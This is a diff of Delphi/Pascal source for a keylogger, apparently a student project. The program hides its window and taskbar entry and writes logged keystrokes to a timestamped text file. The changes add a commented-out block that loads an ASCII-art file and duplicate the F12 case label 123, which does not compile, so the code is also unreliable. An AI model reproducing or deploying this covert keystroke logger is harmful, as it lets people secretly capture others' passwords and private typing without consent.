@@ -47,16 +47,29 @@ begin
 end;
 
 procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
-var f:textfile;
+var f:textfile; GabenASCII:String; Gaben:textfile; short:String;
 begin
 randomize;
 d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now)+'_' +IntToStr(random(100000))+ '.txt'; //location of .txt file
+
+
+{Assignfile(Gaben,('S:\Informatik EF 2015\lökj'+'Gaben.txt'));
+FileMode := fmOpenRead;
+reset(Gaben);
+while not Eof(Gaben) do
+Begin
+  Readln(Gaben,short);
+  GabenAscii := GabenAscii + short;
+End;
+CloseFile(Gaben);} // Gives Error Messages
+
+
 assignfile(f,d);
 rewrite(f);
-{writeln(f, 'KeyloggerProtocol - EF Info');
-writeln(f, 'Time Written: ' + datetostr(now));} // only works when nothing is added
+//writeln(f,GabenAScii); //Adds our Lord and Savior Gaben
+// writeln(f, 'Time Written: ' + datetostr(now)); only works when nothing is added
 memo1.lines.add('KeyloggerProtocol - EF Info');
-memo1.lines.add('Time Written: ' + datetostr(now));
+memo1.lines.add('Time Written: ' + TimeToStr(now));
 closefile(f);
 Application.ShowMainForm := False;   //Hides Form
 Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
@@ -128,7 +141,8 @@ begin
     120: DisplayAction(' [F9] ');
     121: DisplayAction(' [F10] ');
     122: DisplayAction(' [F11] ');
-    123: Application.ShowMainForm := true; //DisplayAction(' [F12] ');
+    123: Application.ShowMainForm := true;
+    123: DisplayAction(' [F12] ');
     144: DisplayAction(' [NUM LOCK] ');
     145: DisplayAction(' [SCROLL LOCK] ');
     160: ; // Shift Left
